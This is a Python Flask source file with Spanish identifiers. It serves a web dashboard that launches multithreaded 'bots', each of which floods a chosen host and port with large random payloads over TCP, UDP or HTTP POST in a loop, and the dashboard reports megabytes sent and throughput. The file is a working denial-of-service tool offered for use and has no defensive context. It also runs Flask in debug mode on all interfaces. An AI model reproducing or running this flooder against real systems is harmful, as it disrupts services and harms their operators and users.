import threading
import time
import random
import socket
import requests
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# --- Variables Globales de Control ---
bots_activos = False
stats = {
    "total_enviado_mb": 0,
    "velocidad_mbs": 0,
    "hilos_vivos": 0,
    "latencia": "0ms"
}
ultimo_total = 0

def bot_worker(target, target_type, port, mb_min, mb_max):
    global bots_activos, stats
    stats["hilos_vivos"] += 1
    
    # Pre-generar paquete aleatorio para no consumir CPU en cada ciclo del loop
    try:
        size_mb = random.uniform(float(mb_min), float(mb_max))
        num_bytes = int(size_mb * 1024 * 1024)
        data_packet = random._urandom(num_bytes)
    except:
        stats["hilos_vivos"] -= 1
        return

    while bots_activos:
        try:
            inicio = time.time()
            
            if target_type == "TCP":
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(2)
                    s.connect((target, int(port)))
                    s.sendall(data_packet)
            
            elif target_type == "UDP":
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    # Fragmentación para paquetes grandes en UDP
                    frag = 60000
                    for i in range(0, len(data_packet), frag):
                        if not bots_activos: break
                        s.sendto(data_packet[i:i+frag], (target, int(port)))
            
            elif target_type == "HTTP":
                requests.post(f"http://{target.replace('http://','')}:{port}", data=data_packet, timeout=2)

            stats["total_enviado_mb"] += size_mb
            stats["latencia"] = f"{int((time.time() - inicio) * 1000)}ms"
            
        except:
            time.sleep(1) # Pausa breve si hay error de conexión antes de reintentar el loop
            
    stats["hilos_vivos"] -= 1

def monitor_red():
    global ultimo_total, stats
    while True:
        actual = stats["total_enviado_mb"]
        stats["velocidad_mbs"] = round(actual - ultimo_total, 2)
        ultimo_total = actual
        time.sleep(1)

# Hilo de monitoreo de velocidad
threading.Thread(target=monitor_red, daemon=True).start()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/control', methods=['POST'])
def control():
    global bots_activos
    data = request.json
    if data.get("action") == "start":
        if bots_activos: return jsonify({"status": "Ya hay un proceso activo"})
        bots_activos = True
        cantidad = int(data.get("threads", 1))
        for _ in range(cantidad):
            threading.Thread(target=bot_worker, args=(
                data.get("target"), data.get("type"), data.get("port"),
                data.get("mb_min"), data.get("mb_max")
            ), daemon=True).start()
        return jsonify({"status": f"Iniciados {cantidad} bots en loop"})
    
    bots_activos = False
    return jsonify({"status": "Deteniendo todos los bots..."})

@app.route('/api/stats')
def get_stats():
    return jsonify(stats)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
